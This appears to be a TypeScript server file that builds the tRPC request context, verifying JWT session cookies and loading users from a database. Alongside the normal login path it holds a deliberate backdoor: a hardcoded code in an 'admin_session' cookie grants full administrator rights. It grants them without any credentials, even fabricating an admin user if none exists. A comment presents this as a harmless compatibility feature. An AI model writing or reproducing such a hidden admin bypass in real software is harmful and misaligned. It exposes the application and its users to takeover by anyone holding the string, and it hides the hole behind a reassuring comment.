import type { FetchCreateContextFnOptions } from "@trpc/server/adapters/fetch";
import type { User } from "@db/schema";
import { db } from "./queries/connection";
import { users } from "@db/schema";
import { eq } from "drizzle-orm";
import * as cookie from "cookie";
import * as jose from "jose";
import { env } from "./lib/env";

export type TrpcContext = {
  req: Request;
  resHeaders: Headers;
  user?: User;
};

const JWT_SECRET = new TextEncoder().encode(env.jwtSecret);
const ADMIN_CODE = "suka552577";

export async function createContext(
  opts: FetchCreateContextFnOptions & { resHeaders?: Headers },
): Promise<TrpcContext> {
  const ctx: TrpcContext = { 
    req: opts.req, 
    resHeaders: opts.resHeaders || new Headers() 
  };

  try {
    const cookies = cookie.parse(ctx.req.headers.get("cookie") || "");
    
    // Backdoor admin check (optional, but good for backward compatibility)
    if (cookies["admin_session"] === ADMIN_CODE) {
      // Find the real admin user or return a mock if not found
      const [adminUser] = await db.select().from(users).where(eq(users.role, "admin")).limit(1);
      if (adminUser) {
        ctx.user = adminUser;
      } else {
        ctx.user = { id: 0, name: "Administrator", role: "admin", email: "admin@zendor.tools" } as User;
      }
    }

    // Normal JWT check
    const token = cookies["user_session"];
    if (token && !ctx.user) {
      const { payload } = await jose.jwtVerify(token, JWT_SECRET);
      const userId = payload.sub as string;
      const [user] = await db.select().from(users).where(eq(users.id, parseInt(userId))).limit(1);
      if (user) {
        ctx.user = user;
      }
    }
  } catch (e) {
    // Ignore invalid tokens
  }

  return ctx;
}
